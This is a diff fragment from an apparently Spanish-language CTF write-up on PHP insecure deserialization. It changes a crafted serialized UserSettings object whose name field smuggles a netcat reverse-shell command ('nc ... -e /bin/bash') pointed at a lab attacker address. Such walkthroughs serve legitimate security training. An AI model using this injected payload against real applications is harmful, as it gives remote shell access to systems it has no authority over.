@@ -54,7 +54,7 @@ Podríamos entonces modificar el value del name del objeto para crear una shell 
 
 ##### Objeto modificado con inyección de codigo:
 
-       O:24:"App\Helpers\UserSettings":4:{s:30:"App\Helpers\UserSettingsName";s:6:"; nc -nv 127.0.0.1 9999 -e /bin/bash;#";s:31:"App\Helpers\UserSettingsEmail";s:17:"porota@porota.com";s:34:"App\Helpers\UserSettingsPassword";s:60:"$2y$10$rhsxRw1X8gpBNhIaMVK9g.jREhfEqNWrNpIGxTpLry1nn8vp8YGXC";s:36:"App\Helpers\UserSettingsProfilePic";s:11:"default.jpg";}
+       O:24:"App\Helpers\UserSettings":4:{s:30:"App\Helpers\UserSettingsName";s:40:""; nc -nv 10.10.14.2 4444 -e /bin/bash;#";s:31:"App\Helpers\UserSettingsEmail";s:19:"attacker@htbank.com";s:34:"App\Helpers\UserSettingsPassword";s:60:"$2y$10$u5o6u2EbjOmobQjVtu87QO8ZwQsDd2zzoqjwS0.5zuPr3hqk9wfda";s:36:"App\Helpers\UserSettingsProfilePic";s:11:"default.jpg";}
 
 
 ---
